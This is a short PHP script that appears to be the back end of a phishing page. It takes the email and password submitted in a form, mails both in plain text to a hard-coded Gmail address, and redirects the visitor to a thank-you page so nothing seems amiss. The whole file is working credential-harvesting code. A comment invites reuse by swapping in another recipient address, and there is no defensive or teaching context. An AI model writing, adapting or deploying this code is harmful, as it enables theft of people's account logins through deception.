<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $name = $_POST["email"];
    $email = $_POST["password"];
    
    $to = "sarooshshahid143@gmail.com"; // Replace with your email address
    $subject = "New Account Submission";
    $message = "Email: $name\nPassword: $email";
    
    // Use mail() function to send the email
    mail($to, $subject, $message);

    // You can redirect the user to a thank-you page if needed
    header("Location: thank_you.html");
    exit();
}
?>
